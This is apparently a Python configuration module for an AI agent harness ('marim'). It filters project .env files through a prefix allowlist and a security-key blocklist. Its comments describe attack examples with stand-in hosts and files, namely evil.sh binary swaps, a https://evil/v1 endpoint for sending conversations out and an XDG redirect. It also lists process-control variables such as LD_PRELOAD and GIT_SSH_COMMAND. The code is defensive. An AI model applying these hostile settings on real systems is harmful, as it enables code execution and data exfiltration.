import logging
import os
from pathlib import Path

logger = logging.getLogger(__name__)

# Numeric MARIM_* knobs that must be a positive integer. A non-int or non-positive
# value (negative/zero) is dropped from the environment during load so the
# downstream reader falls back to its built-in default instead of, e.g., sizing a
# context window to a garbage value. The fix lives here (not at the read site) so
# a hostile project .env can't smuggle a bad value past validation.
_POSITIVE_INT_KEYS = frozenset(
    {
        # MARIM_MAX_CONTEXT_TOKENS is deliberately absent: it is the deprecated
        # alias for MARIM_CONTEXT_BUDGET, where 0 is a meaningful value
        # ("unbudgeted"), so the sanitizer must not strip it; garbage is handled
        # by _context_budget_env's own direct parse.
        "MARIM_WAKE_DEPTH_CAP",
        "MARIM_SUBAGENT_TRANSCRIPT_CAP",
        "MARIM_TOOL_SEARCH_THRESHOLD",
    }
)


def config_dir() -> Path:
    """marim's per-user config directory ($XDG_CONFIG_HOME/marim, else
    ~/.config/marim)."""
    base = os.environ.get("XDG_CONFIG_HOME")
    root = Path(base) if base else Path.home() / ".config"
    return root / "marim"


def builtin_root() -> Path:
    """The package's bundled skills/agents directory
    (``src/marim_harness/builtin``), shipped inside the wheel. Skills and agents
    discovered here are marim's own defaults; project/global roots shadow them."""
    return Path(__file__).resolve().parent.parent / "builtin"


def global_config_path() -> Path:
    """The global .env loaded as a fallback when run outside the project."""
    return config_dir() / ".env"


# Security-relevant settings that a project-local .env may NOT set. A cloned,
# untrusted repo ships its own .env; if it could flip MARIM_TRUST_PROJECT_HOOKS
# it would self-grant execution of its own .marim/hooks.json (arbitrary commands),
# and if it could rewrite the command allow/deny lists it could disarm the shell
# policy. These keys are honored only from the real shell environment or the
# user's global config — never from a project file.
_PROJECT_ENV_BLOCKLIST = frozenset(
    {
        "MARIM_TRUST_PROJECT_HOOKS",
        "MARIM_COMMAND_DENYLIST",
        "MARIM_COMMAND_ALLOWLIST",
        # A cloned repo's .env shipping MARIM_DEFAULT_MODE=auto would silently make
        # your sessions auto-approve every mutation/command in that repo — a
        # supply-chain footgun. The startup approval posture comes only from the
        # shell env or the trusted global config, never a project file.
        "MARIM_DEFAULT_MODE",
        # Provider / endpoint / credential / binary selection. These decide WHERE a
        # model request goes, WHAT credential it carries, and (for claude-cli) WHICH
        # executable is launched — so a cloned untrusted repo must never set them
        # from its .env, the same trust boundary as the hook/command keys above:
        #   * MARIM_PROVIDER=claude-cli + MARIM_CLAUDE_CLI_BIN=.marim/evil.sh ships a
        #     committed executable that the FIRST model request runs (shutil.which
        #     resolves any path containing a separator), i.e. arbitrary code
        #     execution that bypasses the whole trust gate.
        #   * MARIM_PROVIDER=local + MARIM_BASE_URL=https://evil/v1 (or a swapped
        #     MARIM_API_KEY / *_API_KEY) silently exfiltrates the conversation to an
        #     attacker endpoint / account.
        # Honored only from the real shell env or the trusted global config. (Model
        # *selection* — MARIM_MODEL / MARIM_CLAUDE_CLI_MODEL — is deliberately NOT
        # here: a project pinning its model is a legitimate, non-security use and
        # can't redirect an endpoint or swap a binary/credential.)
        "MARIM_PROVIDER",
        "MARIM_BASE_URL",
        "MARIM_API_KEY",
        "MARIM_CLAUDE_CLI_BIN",
        "OPENROUTER_API_KEY",
        "GOOGLE_API_KEY",
        "GEMINI_API_KEY",
        "OPENCODE_API_KEY",
        # The web_search endpoint (tools/web._resolve_base_url) is another egress
        # target a project .env could redirect: a hostile MARIM_SEARXNG_URL both
        # exfiltrates every search query AND feeds attacker-authored "results" back
        # into the agent's context (a prompt-injection channel). Operator-controlled
        # only, same as MARIM_BASE_URL above.
        "MARIM_SEARXNG_URL",
        # The claude-cli per-spawn wall-clock ceiling (subagents.cli_backend). It caps
        # how long a hung CLI can hold a concurrency slot; a cloned repo's .env setting
        # it huge would blunt that safety limit, so it too comes only from the shell
        # env / trusted global config.
        "MARIM_CLAUDE_CLI_TIMEOUT",
        # The XDG base dirs decide WHERE the "trusted" global config/data is read
        # from — and that global config IS allowed to set every key above. When
        # XDG_CONFIG_HOME is unset (the common Linux/macOS case), a project .env
        # setting XDG_CONFIG_HOME=.evil would be applied by the setdefault below,
        # then load_environment reads the "trusted" global config from
        # <repo>/.evil/marim/.env — a file the clone ships — which can then set
        # MARIM_PROVIDER=claude-cli + MARIM_CLAUDE_CLI_BIN=./evil.sh (RCE) or
        # MARIM_BASE_URL / OPENROUTER_API_KEY (exfil), self-contained in the clone.
        # Blocklisting the XDG dirs closes that redirect so the trusted-config
        # location comes only from the real shell env (or the ~/.config default).
        "XDG_CONFIG_HOME",
        "XDG_DATA_HOME",
    }
)


# Allowlist of key PREFIXES a project-local .env may set. The blocklist above is a
# denylist and cannot enumerate the open-ended set of generic process-control vars
# a subprocess inherits — LD_PRELOAD, NODE_OPTIONS, PYTHONPATH, PYTHONSTARTUP, PATH,
# GIT_SSH_COMMAND, BASH_ENV, ENV, … — any of which turns a cloned untrusted repo's
# .env into code execution in every process marim spawns (git checkpoints, hooks,
# LSP, global MCP). A denylist that misses one is a foothold, so the project .env is
# gated by this ALLOWLIST instead: only keys under a documented, marim-owned prefix
# are ever applied from a project file. The dangerous proxy vars match no prefix here
# and are silently dropped. The blocklist still runs first, so a security-relevant
# MARIM_*/provider key (e.g. MARIM_TRUST_PROJECT_HOOKS) is rejected even though its
# prefix is allowed. This gate applies ONLY to the project .env — the real shell env
# and the trusted global config are unaffected.
_PROJECT_ENV_ALLOWED_PREFIXES = (
    "MARIM_",
    "OPENROUTER_",
    "GOOGLE_",
    "GEMINI_",
)


def _project_key_allowed(key: str) -> bool:
    """Whether a project-.env ``key`` may be applied: it must sit under a documented
    marim-owned prefix (allowlist) AND not be a blocklisted security key. Pure."""
    if key in _PROJECT_ENV_BLOCKLIST:
        return False
    return key.startswith(_PROJECT_ENV_ALLOWED_PREFIXES)


def load_environment() -> None:
    """Populate the environment for a run. Loads the project-local .env (cwd and
    parents) first, then the global config as a fallback. An already-set variable
    is never overridden, so precedence is: real shell env, then the project .env,
    then the global config — except that the project .env is applied through an
    ALLOWLIST (``_project_key_allowed``): only documented marim-owned keys that are
    not blocklisted are honored from a project file, so a cloned untrusted repo can
    never smuggle a process-control var (LD_PRELOAD/NODE_OPTIONS/PYTHONPATH/…) into
    the subprocesses marim spawns. The global config is trusted and unfiltered."""
    from dotenv import dotenv_values, find_dotenv, load_dotenv

    project = find_dotenv(usecwd=True)  # project-local, if any
    if project:
        # The project .env comes from a possibly-cloned, untrusted repo and runs
        # on every startup. A corrupt or hostile file must never crash the process
        # before logging is even useful — fail soft (warn + continue), matching the
        # codebase rule that a broken file can't break a turn.
        try:
            project_values = dotenv_values(project)
        except Exception as exc:  # noqa: BLE001 - any parse failure is non-fatal
            logger.warning("Ignoring unreadable project .env at %s: %s", project, exc)
            project_values = {}
        for key, value in project_values.items():
            if value is None or not _project_key_allowed(key):
                continue
            os.environ.setdefault(key, value)  # shell env still wins
    load_dotenv(global_config_path())  # global fallback (may set blocked keys)
    _sanitize_positive_ints()


def _sanitize_positive_ints() -> None:
    """Drop any ``_POSITIVE_INT_KEYS`` env var whose value isn't a positive
    integer. Removing it (rather than rewriting it) lets the downstream reader's
    own default apply. Logs a warning so a typo'd or hostile value is visible."""
    for key in _POSITIVE_INT_KEYS:
        raw = os.environ.get(key)
        if raw is None:
            continue
        try:
            parsed = int(raw.strip())
        except ValueError:
            logger.warning("Ignoring invalid %s=%r (not an integer); using default.", key, raw)
            del os.environ[key]
            continue
        if parsed <= 0:
            logger.warning("Ignoring invalid %s=%r (must be positive); using default.", key, raw)
            del os.environ[key]
